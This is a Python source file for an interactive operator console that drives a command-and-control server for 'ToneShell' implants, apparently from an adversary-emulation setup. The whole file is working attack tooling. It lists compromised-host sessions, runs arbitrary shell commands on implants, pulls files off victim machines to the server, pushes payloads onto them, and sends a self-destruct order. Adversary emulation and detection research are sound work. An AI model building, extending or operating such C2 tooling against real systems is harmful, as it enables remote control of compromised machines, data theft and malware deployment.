#!/usr/bin/env python3
"""
toneshell_shell.py — Interactive shell for ToneShell C2 sessions.

Wraps evalsC2client's REST API with a persistent prompt so you don't have
to hand-craft JSON task strings or copy session GUIDs for every command.

Usage:
    python toneshell_shell.py [--port 9999]

Built-in commands (case-insensitive):
    sessions                        list active C2 sessions
    use <session_id>                attach to a session
    detach                          unattach (return to session-picker mode)
    get <remote_path>               upload file FROM implant to C2 server
    put <payload_name> <dest_path>  push file FROM server payloads dir TO implant
    kill                            send TERMINATE (id=255) to current implant
    help                            show this help
    exit / quit                     exit the shell

Anything else is sent as an EXEC (id=5) shell command to the current session.
"""

import argparse
import json
import sys
import time

try:
    import readline  # noqa: F401 – enables arrow-key history on Linux/Mac
except ImportError:
    pass  # Windows: no readline, input() still works

import requests
from datetime import datetime, timedelta

# ── REST API constants (mirrors evalsC2client.py) ──────────────────────────
API_RESP_TYPE_KEY    = "type"
API_RESP_STATUS_KEY  = "status"
API_RESP_DATA_KEY    = "data"
API_RESP_STATUS_OK   = 0

RESP_TYPE_CTRL         = 0
RESP_TYPE_VERSION      = 1
RESP_TYPE_CONFIG       = 2
RESP_TYPE_SESSIONS     = 3
RESP_TYPE_TASK_CMD     = 4
RESP_TYPE_TASK_OUTPUT  = 5
RESP_TYPE_TASK_INFO    = 6

TASK_STATUS_KEY    = "taskStatus"
TASK_GUID_KEY      = "guid"
TASK_COMMAND_KEY   = "command"
TASK_OUTPUT_KEY    = "taskOutput"
TASK_STATUS_NEW       = 0
TASK_STATUS_PENDING   = 1
TASK_STATUS_FINISHED  = 2
TASK_STATUS_DISCARDED = 3

# ── ToneShell packet type IDs ───────────────────────────────────────────────
TS_FILE_DOWNLOAD = 3   # server → implant (push file to implant)
TS_EXEC          = 5   # execute shell command on implant
TS_FILE_UPLOAD   = 7   # implant → server (pull file from implant)
TS_TERMINATE     = 255 # self-destruct


class ApiError(Exception):
    pass


class ToneShellShell:
    def __init__(self, port: str):
        self.port      = port
        self.base_url  = f"http://localhost:{port}/api/v1.0"
        self.session   = None   # currently attached session GUID
        self.hostname  = None   # display name for the session
        self._task_num = 1      # auto-incrementing task counter

    # ── internal helpers ────────────────────────────────────────────────────

    def _next_task_num(self) -> int:
        n = self._task_num
        self._task_num += 1
        return n

    def _extract(self, resp: requests.Response, expected_type: int):
        d = resp.json()
        if d.get(API_RESP_STATUS_KEY) != API_RESP_STATUS_OK:
            raise ApiError(d.get(API_RESP_DATA_KEY, "unknown error"))
        if d.get(API_RESP_TYPE_KEY) != expected_type:
            raise ApiError(f"expected response type {expected_type}, got {d.get(API_RESP_TYPE_KEY)}")
        return d[API_RESP_DATA_KEY]

    def _post_task(self, task_json: dict) -> dict:
        url  = f"{self.base_url}/session/{self.session}/task"
        body = json.dumps(task_json)
        resp = requests.post(url, body)
        return self._extract(resp, RESP_TYPE_TASK_INFO)

    def _poll_output(self, task_guid: str, timeout_s: int = 120) -> str | None:
        url      = f"{self.base_url}/task/{task_guid}"
        deadline = datetime.now() + timedelta(seconds=timeout_s)
        while datetime.now() < deadline:
            resp = requests.get(url)
            try:
                data   = self._extract(resp, RESP_TYPE_TASK_INFO)
                status = data[TASK_STATUS_KEY]
                if status == TASK_STATUS_FINISHED:
                    return data.get(TASK_OUTPUT_KEY, "")
                if status == TASK_STATUS_DISCARDED:
                    print("[!] task discarded by server")
                    return None
            except ApiError:
                pass
            time.sleep(2)
        print("[!] timed out waiting for output")
        return None

    # ── built-in commands ───────────────────────────────────────────────────

    def cmd_sessions(self):
        resp     = requests.get(f"{self.base_url}/sessions")
        sessions = self._extract(resp, RESP_TYPE_SESSIONS) or []
        if not sessions:
            print("  (no active sessions)")
            return
        print(f"  {'SESSION ID':<36}  HOSTNAME")
        print(f"  {'-'*36}  {'-'*24}")
        for s in sessions:
            guid     = s.get("guid", "?")
            hostname = s.get("hostName", s.get("hostname", "?"))
            marker   = " *" if guid == self.session else "  "
            print(f"{marker}{guid}  {hostname}")

    def cmd_use(self, session_id: str):
        resp     = requests.get(f"{self.base_url}/session/{session_id}")
        data     = self._extract(resp, RESP_TYPE_SESSIONS)
        if isinstance(data, list):
            data = data[0]
        self.session  = session_id
        self.hostname = data.get("hostName", data.get("hostname", session_id[:8]))
        print(f"[+] attached to {self.hostname} ({session_id})")

    def cmd_detach(self):
        print(f"[*] detached from {self.session}")
        self.session  = None
        self.hostname = None

    def cmd_exec(self, command: str):
        task_num = self._next_task_num()
        task     = {"id": TS_EXEC, "taskNum": task_num, "args": command}
        info     = self._post_task(task)
        task_guid = info[TASK_GUID_KEY]
        print(f"[*] task {task_guid} queued (taskNum={task_num}), waiting …")
        output = self._poll_output(task_guid)
        if output is not None:
            print(output, end="" if output.endswith("\n") else "\n")

    def cmd_get(self, remote_path: str):
        """Pull a file FROM the implant to the C2 server upload dir."""
        task_num = self._next_task_num()
        task     = {"id": TS_FILE_UPLOAD, "taskNum": task_num, "args": remote_path}
        info     = self._post_task(task)
        print(f"[*] file-get task {info[TASK_GUID_KEY]} queued (implant will push {remote_path})")

    def cmd_put(self, payload_name: str, remote_dest: str):
        """Push a file FROM the C2 server payloads dir TO the implant."""
        task_num = self._next_task_num()
        task     = {"id": TS_FILE_DOWNLOAD, "taskNum": task_num,
                    "args": remote_dest, "payload": payload_name}
        info     = self._post_task(task)
        print(f"[*] file-put task {info[TASK_GUID_KEY]} queued "
              f"(server/{payload_name} → implant:{remote_dest})")

    def cmd_kill(self):
        confirm = input("[!] send TERMINATE to implant? [y/N] ").strip().lower()
        if confirm != "y":
            print("[*] aborted")
            return
        task     = {"id": TS_TERMINATE}
        body     = json.dumps(task)
        url      = f"{self.base_url}/session/{self.session}/task"
        resp     = requests.post(url, body)
        print("[+] TERMINATE sent" if resp.ok else f"[-] {resp.text}")

    def cmd_output(self):
        url  = f"{self.base_url}/session/{self.session}/task/output"
        resp = requests.get(url)
        data = self._extract(resp, RESP_TYPE_TASK_OUTPUT)
        print(data or "(no output)")

    @staticmethod
    def cmd_help():
        print(__doc__)

    # ── main loop ───────────────────────────────────────────────────────────

    def prompt(self) -> str:
        if self.session:
            label = self.hostname or self.session[:8]
            return f"[{label}]> "
        return "[no session]> "

    def run(self):
        print("ToneShell interactive shell  (type 'help' for commands)")
        print(f"Connected to controlServer on port {self.port}\n")
        try:
            self.cmd_sessions()
        except Exception as e:
            print(f"[!] could not reach controlServer: {e}")

        while True:
            try:
                line = input(self.prompt()).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not line:
                continue

            parts = line.split(None, 2)
            cmd   = parts[0].lower()

            try:
                if cmd in ("exit", "quit"):
                    break

                elif cmd == "help":
                    self.cmd_help()

                elif cmd == "sessions":
                    self.cmd_sessions()

                elif cmd == "use":
                    if len(parts) < 2:
                        print("usage: use <session_id>")
                    else:
                        self.cmd_use(parts[1])

                elif cmd == "detach":
                    if not self.session:
                        print("[*] not attached to any session")
                    else:
                        self.cmd_detach()

                elif cmd in ("output", "getoutput"):
                    if not self.session:
                        print("[!] not attached to a session")
                    else:
                        self.cmd_output()

                elif cmd == "get":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 2:
                        print("usage: get <remote_path>")
                    else:
                        self.cmd_get(parts[1])

                elif cmd == "put":
                    if not self.session:
                        print("[!] not attached to a session")
                    elif len(parts) < 3:
                        print("usage: put <payload_name> <remote_dest>")
                    else:
                        self.cmd_put(parts[1], parts[2])

                elif cmd == "kill":
                    if not self.session:
                        print("[!] not attached to a session")
                    else:
                        self.cmd_kill()

                else:
                    if not self.session:
                        print("[!] not attached to a session — type 'sessions' then 'use <id>'")
                    else:
                        self.cmd_exec(line)

            except ApiError as e:
                print(f"[-] API error: {e}")
            except requests.ConnectionError:
                print(f"[-] cannot reach controlServer at {self.base_url}")
            except Exception as e:
                print(f"[-] {e}")

        print("[*] bye")


def main():
    parser = argparse.ArgumentParser(description="Interactive ToneShell C2 shell")
    parser.add_argument("--port", default="9999", metavar="PORT",
                        help="controlServer REST API port (default 9999)")
    args = parser.parse_args()
    ToneShellShell(args.port).run()


if __name__ == "__main__":
    main()
